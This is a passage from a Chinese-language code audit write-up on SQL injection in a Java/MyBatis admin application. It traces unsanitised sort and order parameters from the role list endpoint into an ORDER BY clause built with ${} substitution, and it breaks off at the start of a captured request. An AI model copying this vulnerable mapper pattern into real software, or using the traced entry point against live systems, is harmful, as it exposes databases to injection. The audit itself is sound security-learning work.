+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;update</span> <span class=na>id=</span><span class=s>&#34;updateWithQuery&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        update `menu`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;set&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper.id != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `id` = #{setWrapper.id},
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper.title != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `title` = #{setWrapper.title},
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper.key != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `key` = #{setWrapper.key},
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper.parent != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `parent` = #{setWrapper.parent},
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;setWrapper.ts != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                    `ts` = #{setWrapper.ts},
+</span></span><span class=line><span class=cl>                <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/set&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/update&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 一共有2个select，一个delete以及一个update调用了这个where语句，因为他们产生SQL注入的原因是相同的，所以我们只需要证明其中一个存在SQL注入即可，我们从第一个select开始追溯，也就是第62行的select语句。</p><p>​ 向上追溯：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=s>&#34;/count&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>CountDTO</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=nf>count</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CountDTO</span><span class=w> </span><span class=n>dto</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>dashboardService</span><span class=p>.</span><span class=na>count</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>(</span><span class=n>dto</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 确认被count路由调用，不过这里并没有接受传参，也就是说没有可操控的参数，所以这里是不存在SQL注入的。那么我们转移到第二个select语句中。</p><p>​ 经过审计发现，该select语句中的where有两个方法调用了它，但是这两个方法中的参数仅有value可控而column是不可控的，所以这里是不存在SQL注入的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findIdsByKeys</span><span class=p>(</span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>keys</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>ids</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>CollectionUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>keys</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Menu</span><span class=o>&gt;</span><span class=w> </span><span class=n>menus</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>menuDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>QueryWrapper</span><span class=p>.</span><span class=na>newBuilder</span><span class=p>().</span><span class=na>in</span><span class=p>(</span><span class=s>&#34;key&#34;</span><span class=p>,</span><span class=w> </span><span class=n>keys</span><span class=p>).</span><span class=na>build</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>menus</span><span class=p>.</span><span class=na>forEach</span><span class=p>(</span><span class=n>menu</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>ids</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>menu</span><span class=p>.</span><span class=na>getId</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ids</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findKeysByRoleId</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>id</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>keys</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>RoleMenuRef</span><span class=o>&gt;</span><span class=w> </span><span class=n>refs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>roleMenuRefService</span><span class=p>.</span><span class=na>findByRoleId</span><span class=p>(</span><span class=n>id</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>CollectionUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>refs</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>ids</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>refs</span><span class=p>.</span><span class=na>forEach</span><span class=p>(</span><span class=n>ref</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>ids</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>ref</span><span class=p>.</span><span class=na>getMenuId</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Menu</span><span class=o>&gt;</span><span class=w> </span><span class=n>menus</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>menuDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>QueryWrapper</span><span class=p>.</span><span class=na>newBuilder</span><span class=p>().</span><span class=na>in</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>,</span><span class=w> </span><span class=n>ids</span><span class=p>).</span><span class=na>build</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>menus</span><span class=p>.</span><span class=na>forEach</span><span class=p>(</span><span class=n>menu</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>keys</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>menu</span><span class=p>.</span><span class=na>getKey</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>keys</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 那么我们转到delete，但是delete则是未被调用，所以我们再转到update发现这个也未被调用，所以这个where语句是不存在SQL注入的。</p><h5 id=so失败>s、o（失败）</h5><p>​ 我们向上追溯，找到了该参数仅有的控制器。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=s>&#34;/menu_tree&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>List</span><span class=o>&lt;</span><span class=n>MenuDTO</span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=nf>queryMenuTree</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>MenuDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>dtos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>menuService</span><span class=p>.</span><span class=na>findTree</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>(</span><span class=n>dtos</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 经过审计发现，这里的两个参数均无法操控，所以这里仍旧不存在SQL注入。</p><h4 id=srcmainresourcesmapperrolemapperxml成功>src/main/resources/mapper/RoleMapper.xml（成功）</h4><p>​ 这个xml文件和前一个是相同的，所以这里就不贴出并作分析了，仅贴出存在SQL注入的代码片段。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;select</span> <span class=na>id=</span><span class=s>&#34;selectWithQuery&#34;</span> <span class=na>resultMap=</span><span class=s>&#34;baseMap&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        select * from `role`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;sortWrapper != null and sortWrapper.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            order by
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;sortWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;s&#34;</span> <span class=na>item=</span><span class=s>&#34;o&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                `${s}` ${o}
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;offset != null and limit != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            limit #{offset}, #{limit}
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/select&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 这里审计我们可知s和o都是可疑注入点，我们向上追溯发现有多处调用了这个select语句。经过审计之后确定如下方法中存在调用，并且参数s和o均可控，除此之外的其他方法并没有使用到order by语句的定义，虽使用了where，但是column参数不可控，所以不存在SQL注入。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>RoleDTO</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findByPage</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Set</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>roleIds</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashSet</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapperBuilder</span><span class=w> </span><span class=n>builder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>QueryWrapperBuilder</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;builtin&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>sort</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>order</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;asc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=cm>/*此处代码省略*/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapper</span><span class=w> </span><span class=n>wrapper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>builder</span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Role</span><span class=o>&gt;</span><span class=w> </span><span class=n>roles</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>roleDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=cm>/*此处代码省略*/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 经过审计我们发现这个方法中在</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>sort</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>order</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;asc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这个代码块中将sort和order参数放入了builder对象中，而在此之前并没有进行防止SQL注入的处理，而这两个参数就是在xml文档中的o和s所以这里是存在一个SQL注入的。</p><p>​ 而这个方法则被下面这个控制器所调用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/list&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>RoleDTO</span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=nf>queryPage</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;sort&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;order&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;key&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>RoleDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>roleService</span><span class=p>.</span><span class=na>findByPage</span><span class=p>(</span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>(</span><span class=n>response</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 可见这里也没有进行处理，直接就将参数传入到findByPage方法中。那么我们定位到前端的角色管理模块，访问后抓包，抓得如下数据包。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/auth/role/list?page=1&amp;limit=10</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.23.192.1</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
